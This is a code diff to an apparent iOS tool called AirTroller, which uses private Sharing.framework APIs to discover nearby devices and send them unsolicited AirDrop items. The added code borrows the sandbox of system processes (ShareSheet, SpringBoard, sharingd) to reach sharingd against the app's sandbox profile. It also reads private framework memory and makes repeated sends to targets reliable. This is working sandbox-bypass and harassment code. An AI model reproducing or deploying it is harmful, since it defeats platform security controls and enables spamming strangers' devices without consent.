@@ -38,6 +38,15 @@ extern pid_t sbx_pidof(const char *name);
     NSArray *_lastPeople;
 }
 
+// -[SFAirDropBrowser updateDiscoveredPeople] messages _delegate with this
+// selector and NO respondsToSelector: guard (verified at 0x1a8f25d54 on
+// 23A5308g), so a delegate that does not implement it is killed with
+// "unrecognized selector" on the first browser callback. This method exists to
+// keep that from happening.
+- (void)browserWillChangePeople:(id)people {
+    [self fire];
+}
+
 - (void)browserDidUpdateMePeople:(id)me knownPeople:(id)known unknownPeople:(id)unknown {
     [self fire];
 }
@@ -46,11 +55,12 @@ extern pid_t sbx_pidof(const char *name);
     [self fire];
 }
 
+// Delivered to _batchDelegate only (ivar 0x38), never to _delegate: Apple's own
+// share sheet installs it with -setBatchDelegate:, and it is the only callback
+// that carries the discovered node list. The browser does fill
+// -[SFAirDropBrowser people] on every callback as well (updateDiscoveredPeople
+// writes ivar 0x28), so the poll is a second, valid path.
 - (void)browserDidUpdatePeople:(id)people {
-    // This callback is the only place the node list is delivered: the framework
-    // hands it to the delegate as an argument and never fills
-    // -[SFAirDropBrowser people] on its own (updateDiscoveredPeople has no
-    // internal caller). Stash it; the poll reads this copy.
     if ([people isKindOfClass:[NSArray class]]) {
         @synchronized (self) {
             _lastPeople = [(NSArray *)people copy];
@@ -66,11 +76,12 @@ extern pid_t sbx_pidof(const char *name);
     }
 }
 
-- (void)browser:(id)browser didInsertPersonAtIndex:(id)index {
+// The real type encodings are v32@0:8@16q24 - the index is an NSInteger.
+- (void)browser:(id)browser didInsertPersonAtIndex:(NSInteger)index {
     [self fire];
 }
 
-- (void)browser:(id)browser didDeletePersonAtIndex:(id)index {
+- (void)browser:(id)browser didDeletePersonAtIndex:(NSInteger)index {
     [self fire];
 }
 
@@ -264,6 +275,117 @@ extern pid_t sbx_pidof(const char *name);
     return @"sandbox dumped to the log above";
 }
 
+#pragma mark reachability (borrowed sandbox window)
+
+// Sharing.framework connects to com.apple.sharingd with
+// xpc_connection_create_mach_service(..., flags 0) and the sandbox is consulted
+// at connection creation. For a sideloaded app the profile has no
+// (allow mach-lookup ...) rule for that name, and the entitlement that would
+// grant it lives in the provisioning profile, which SideStore cannot produce.
+//
+// So the only way in is to borrow a profile that has the rule, for exactly the
+// call that creates the connection: -[SFAirDropBrowser start] for discovery and
+// each -startSendForBundleID:... for a send (every SFOperation creates its own
+// connection at -Resume). The borrowed pointer is restored in a @finally, the
+// donor is a system process that cannot exit mid-call, and the sandbox object is
+// deliberately NOT refcount-bumped: the kext audit could not prove +0 is a
+// refcount, and a skipped bump is exactly how the old code produced a dangling
+// pointer.
+static NSRecursiveLock *gReachLock = nil;
+static NSString *gDonorName = nil;
+static BOOL gReachableNormally = NO;
+static BOOL gProbedNormally = NO;
+static BOOL gDonorSearchFailed = NO;
+
++ (void)airtrollerReachSetup {
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        gReachLock = [NSRecursiveLock new];
+    });
+}
+
+/// Ordered candidates: the share sheet process hosts the AirDrop UI, SpringBoard
+/// hosts the cover-sheet share UI, sharingd itself normally registers the service
+/// rather than looking it up.
++ (NSArray<NSString *> *)donorCandidates {
+    return @[ @"ShareSheet", @"SpringBoard", @"sharingd" ];
+}
+
++ (pid_t)firstReachableDonor {
+    [self airtrollerReachSetup];
+
+    if (gDonorName != nil) {
+        pid_t pid = sbx_pidof(gDonorName.UTF8String);
+        if (pid != 0) {
+            return pid;
+        }
+        gDonorName = nil;
+    }
+
+    for (NSString *name in [self donorCandidates]) {
+        pid_t pid = sbx_pidof(name.UTF8String);
+        if (pid == 0) {
+            continue;
+        }
+        if (sbx_adopt_sandbox_from_pid(pid) != 0) {
+            continue;
+        }
+        NSString *probe = nil;
+        @try {
+            probe = [self probeMachService:@"com.apple.sharingd" timeout:0.6];
+        } @finally {
+            sbx_restore_sandbox();
+        }
+        if ([probe hasPrefix:@"reachable"]) {
+            gDonorName = name;
+            gDonorSearchFailed = NO;
+            return pid;
+        }
+    }
+    gDonorSearchFailed = YES;
+    return 0;
+}
+
+/// Runs `block` with a sandbox that may reach sharingd, when one is needed.
++ (void)withBorrowedReachability:(dispatch_block_t)block {
+    if (block == nil) {
+        return;
+    }
+    [self airtrollerReachSetup];
+    [gReachLock lock];
+    @try {
+        if (!gProbedNormally) {
+            gProbedNormally = YES;
+            gReachableNormally =
+                [[self probeMachService:@"com.apple.sharingd" timeout:0.4] hasPrefix:@"reachable"];
+        }
+        if (gReachableNormally) {
+            block();
+            return;
+        }
+
+        // A failed search already cost three probe timeouts; don't repeat it on
+        // every send. +adoptionLadder clears the flag when the user asks again.
+        if (gDonorSearchFailed) {
+            block();
+            return;
+        }
+
+        pid_t donor = [self firstReachableDonor];
+        if (donor == 0 || sbx_adopt_sandbox_from_pid(donor) != 0) {
+            block();      // no donor: let the framework report the failure
+            return;
+        }
+        @try {
+            block();
+        } @finally {
+            sbx_restore_sandbox();
+        }
+    } @finally {
+        [gReachLock unlock];
+    }
+}
+
 #pragma mark sandbox adoption
 
 + (pid_t)pidOfProcess:(NSString *)name {
@@ -273,24 +395,56 @@ extern pid_t sbx_pidof(const char *name);
     return sbx_pidof(name.UTF8String);
 }
 
-/// Borrows a valid sandbox object from another process (never NULL) and re-probes.
-/// The previous pointer is left in place if it does not help.
+// Borrows a valid sandbox object from another process and probes inside the
+// window. The pointer is ALWAYS restored: the old version left the borrow
+// installed when it "did not help", which is how a foreign cred survives long
+// enough to become a dangling pointer.
 + (NSString *)attemptSandboxAdoptionWithPID:(pid_t)pid {
-    NSString *before = [self probeSharingdReachability];
-    if ([before hasPrefix:@"reachable"]) {
-        return [NSString stringWithFormat:@"already reachable (%@)", before];
-    }
+    [self airtrollerReachSetup];
+    [gReachLock lock];
+    NSString *report = nil;
+    @try {
+        NSString *before = [self probeMachService:@"com.apple.sharingd" timeout:0.6];
+        if ([before hasPrefix:@"reachable"]) {
+            gReachableNormally = YES;
+            report = [NSString stringWithFormat:@"already reachable (%@)", before];
+            return report;
+        }
 
-    if (sbx_adopt_sandbox_from_pid(pid) != 0) {
-        return [NSString stringWithFormat:@"could not adopt the sandbox of pid %d", pid];
-    }
+        if (sbx_adopt_sandbox_from_pid(pid) != 0) {
+            report = [NSString stringWithFormat:@"refused: pid %d did not pass the sandbox layout gate", pid];
+            return report;
+        }
 
-    NSString *after = [self probeSharingdReachability];
-    if ([after hasPrefix:@"reachable"]) {
-        return [NSString stringWithFormat:@"SUCCESS - sharingd reachable after adopting pid %d (%@)", pid, after];
+        NSString *after = nil;
+        @try {
+            after = [self probeMachService:@"com.apple.sharingd" timeout:1.0];
+        } @finally {
+            sbx_restore_sandbox();
+        }
+        report = [NSString stringWithFormat:@"%@ after a one-shot borrow from pid %d (restored)",
+                  after, pid];
+    } @finally {
+        [gReachLock unlock];
     }
+    return report ?: @"adoption failed";
+}
 
-    return [NSString stringWithFormat:@"still blocked after adopting pid %d (%@)", pid, after];
+/// Tries the donor ladder in order. Each candidate is a windowed borrow, so a
+/// wrong donor costs one probe and leaves no state behind.
++ (NSString *)adoptionLadder {
+    gDonorSearchFailed = NO;
+    NSMutableString *out = [NSMutableString string];
+    for (NSString *name in [self donorCandidates]) {
+        pid_t pid = sbx_pidof(name.UTF8String);
+        if (pid == 0) {
+            [out appendFormat:@"\n  %@: not running", name];
+            continue;
+        }
+        [out appendFormat:@"\n  %@ (pid %d): %@", name, pid,
+                          [self attemptSandboxAdoptionWithPID:pid]];
+    }
+    return out;
 }
 
 + (NSString *)attemptSharingdSandboxBypass {
@@ -315,10 +469,23 @@ extern pid_t sbx_pidof(const char *name);
 #pragma mark payload
 
 + (nullable NSURL *)preparePayloadFile {
-    NSURL *url = [NSURL fileURLWithPath:[NSTemporaryDirectory() stringByAppendingPathComponent:@"AirTroller-payload.txt"]];
-    NSString *contents = [NSString stringWithFormat:@"AirTroller test payload (%@)\n", [NSDate date]];
-    if (![contents writeToURL:url atomically:YES encoding:NSUTF8StringEncoding error:nil]) {
-        AirTrollerBridge.shared.lastError = @"could not write the AirTroller payload file";
+    // A picture, not a text file: the target's prompt shows the item preview,
+    // and the original AirTroller sent an image for exactly that reason.
+    NSURL *url = [NSURL fileURLWithPath:[NSTemporaryDirectory() stringByAppendingPathComponent:@"AirTroller-payload.png"]];
+    UIGraphicsImageRendererFormat *format = [UIGraphicsImageRendererFormat defaultFormat];
+    UIGraphicsImageRenderer *renderer =
+        [[UIGraphicsImageRenderer alloc] initWithSize:CGSizeMake(256, 256) format:format];
+    UIImage *image = [renderer imageWithActions:^(UIGraphicsImageRendererContext *context) {
+        [[UIColor blackColor] setFill];
+        UIRectFill(CGRectMake(0, 0, 256, 256));
+        [[UIColor systemOrangeColor] setFill];
+        UIRectFill(CGRectMake(24, 24, 208, 208));
+        [[UIColor blackColor] setFill];
+        UIRectFill(CGRectMake(56, 56, 144, 144));
+    }];
+    NSData *png = UIImagePNGRepresentation(image);
+    if (png == nil || ![png writeToURL:url atomically:YES]) {
+        AirTrollerBridge.shared.lastError = @"could not write the AirTroller payload PNG";
         return nil;
     }
     return url;
@@ -366,8 +533,13 @@ extern pid_t sbx_pidof(const char *name);
                 [weakSelf handlePeopleChanged];
             };
         }
-        if ([browser respondsToSelector:@selector(setDelegate:)]) {
-            [browser setDelegate:self.browserDelegate];
+        // Apple's own share sheet installs only -setBatchDelegate: (its
+        // SFAirDropActivityViewController never sets -delegate). The batch
+        // delegate is the only channel that receives the people list, and the
+        // plain delegate is messaged browserWillChangePeople: with no guard, so
+        // using it would crash on the first callback.
+        if ([browser respondsToSelector:@selector(setBatchDelegate:)]) {
+            [browser setBatchDelegate:self.browserDelegate];
         }
 
         self.browser = browser;
@@ -378,7 +550,12 @@ extern pid_t sbx_pidof(const char *name);
             return NO;
         }
 
-        [browser start];
+        // -start creates the XPC connection to com.apple.sharingd, and the
+        // sandbox is consulted at connection creation. Borrow a reachable
+        // profile for exactly that call, then restore it immediately.
+        [AirTrollerBridge withBorrowedReachability:^{
+            [browser start];
+        }];
     }
 
     self.lastError = @"";
@@ -391,8 +568,8 @@ extern pid_t sbx_pidof(const char *name);
         if (browser == nil) {
             return;
         }
-        if ([browser respondsToSelector:@selector(setDelegate:)]) {
-            [browser setDelegate:nil];
+        if ([browser respondsToSelector:@selector(setBatchDelegate:)]) {
+            [browser setBatchDelegate:nil];
         }
         if ([browser respondsToSelector:@selector(stop)]) {
             [browser stop];
@@ -509,7 +686,12 @@ extern pid_t sbx_pidof(const char *name);
             model = [node model];
         }
         if ([node respondsToSelector:@selector(formattedHandles)]) {
-            handles = [node formattedHandles];
+            id raw = [node formattedHandles];
+            if ([raw isKindOfClass:[NSArray class]]) {
+                handles = [(NSArray *)raw componentsJoinedByString:@", "];
+            } else if ([raw isKindOfClass:[NSString class]]) {
+                handles = raw;
+            }
         }
         if ([node respondsToSelector:@selector(isDisabled)]) {
             disabled = [node isDisabled];
@@ -539,6 +721,55 @@ extern pid_t sbx_pidof(const char *name);
 
 #pragma mark send / cancel
 
+// startSend/cancelSend take no locks, and the framework delivers its own
+// operation callbacks - including its own event-4/9/10 cancelSend - on
+// __dispatch_main_q. Calling them from the AirTroller worker races that
+// callback: two cancelSends can interleave between the load and the clear of
+// _sender and double-release the operation. Every node call goes through here.
+static void AirTrollerOnMainSync(dispatch_block_t block) {
+    if ([NSThread isMainThread]) {
+        block();
+    } else {
+        dispatch_sync(dispatch_get_main_queue(), block);
+    }
+}
+
++ (Ivar)airtrollerSenderIvar {
+    static Ivar ivar = NULL;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        Class nodeClass = NSClassFromString(@"SFAirDropNode");
+        ivar = nodeClass != Nil ? class_getInstanceVariable(nodeClass, "_sender") : NULL;
+    });
+    return ivar;
+}
+
++ (BOOL)nodeHasLiveOperation:(NSObject *)node {
+    Ivar ivar = [self airtrollerSenderIvar];
+    if (node == nil || ivar == NULL) {
+        return NO;
+    }
+    uint8_t *base = (uint8_t *)(__bridge void *)node + ivar_getOffset(ivar);
+    return *(void **)base != NULL;
+}
+
++ (NSInteger)lastOperationEventForNode:(NSObject *)node {
+    // __SFOperationNotifyClient stores the event number at op+0xb0 before it
+    // invokes the client callback, so the node's live _sender exposes the event
+    // machine even though SFAirDropNode owns the callback.
+    Ivar ivar = [self airtrollerSenderIvar];
+    if (node == nil || ivar == NULL) {
+        return -1;
+    }
+    uint8_t *base = (uint8_t *)(__bridge void *)node + ivar_getOffset(ivar);
+    void *operation = *(void **)base;
+    if (operation == NULL) {
+        return -1;
+    }
+    uint32_t event = *(uint32_t *)((uint8_t *)operation + 0xb0);
+    return (NSInteger)event;
+}
+
 - (BOOL)startSendToNode:(NSObject *)node
                bundleID:(NSString *)bundleID
               sessionID:(NSString *)sessionID
@@ -557,32 +788,51 @@ extern pid_t sbx_pidof(const char *name);
         return NO;
     }
 
-    id<AirTrollerNodeProtocol> target = (id<AirTrollerNodeProtocol>)node;
-    @try {
-        [target startSendForBundleID:bundleID
-                          sessionID:sessionID
-                              items:items
-                        description:description
-                       previewImage:previewImage
-                     fromShareSheet:fromShareSheet];
-    } @catch (NSException *exception) {
-        self.lastError = [NSString stringWithFormat:@"startSend raised %@", exception.reason ?: @"unknown"];
-        return NO;
-    }
+    __block BOOL started = NO;
+    __block NSString *failure = nil;
 
-    self.lastError = @"";
-    return YES;
+    AirTrollerOnMainSync(^{
+        id<AirTrollerNodeProtocol> target = (id<AirTrollerNodeProtocol>)node;
+        @try {
+            // The framework silently refuses a send while _sender is non-NULL
+            // (cbnz at 0x1a8f29bf4), and a cycle interrupted during its trigger
+            // window can leave one behind. cancelSend is a no-op on NULL, so
+            // this recovery is free.
+            [target cancelSend];
+
+            [AirTrollerBridge withBorrowedReachability:^{
+                [target startSendForBundleID:bundleID
+                                   sessionID:sessionID
+                                       items:items
+                                 description:description
+                                previewImage:previewImage
+                              fromShareSheet:fromShareSheet];
+            }];
+
+            started = [AirTrollerBridge nodeHasLiveOperation:node];
+            if (!started) {
+                failure = @"startSend left no live operation";
+            }
+        } @catch (NSException *exception) {
+            failure = [NSString stringWithFormat:@"startSend raised %@", exception.reason ?: @"unknown"];
+        }
+    });
+
+    self.lastError = started ? @"" : (failure ?: @"startSend did not start");
+    return started;
 }
 
 - (void)cancelSendToNode:(NSObject *)node {
     if (node == nil || ![node respondsToSelector:@selector(cancelSend)]) {
         return;
     }
-    @try {
-        [(id<AirTrollerNodeProtocol>)node cancelSend];
-    } @catch (NSException *exception) {
-        // nothing sensible to do, the operation is either gone or already dead
-    }
+    AirTrollerOnMainSync(^{
+        @try {
+            [(id<AirTrollerNodeProtocol>)node cancelSend];
+        } @catch (NSException *exception) {
+            // nothing sensible to do, the operation is either gone or already dead
+        }
+    });
 }
 
 #pragma mark operation events
@@ -595,9 +845,11 @@ extern pid_t sbx_pidof(const char *name);
     if (node == nil || ![node respondsToSelector:selector]) {
         return;
     }
-    // The framework's own callback is (operation, event, results); with no live
-    // SFOperationRef the first argument is only meaningful for event 2, which is
-    // why replay skips it (see +safeReplayEvents).
+    // Event 2 (AskUser) calls _SFOperationResume(first argument): with no live
+    // SFOperationRef that writes a pthread mutex over the node's
+    // _endpointUUID/_realName block and then sends an XPC message through
+    // _derivedIntentIdentifier. There is no safe synthetic value, so refuse it
+    // here as well as in +safeReplayEvents.
     id payload = (results != nil) ? results : node;
     @try {
         [(id<AirTrollerNodeProtocol>)node handleOperationCallback:payload event:event withResults:payload];
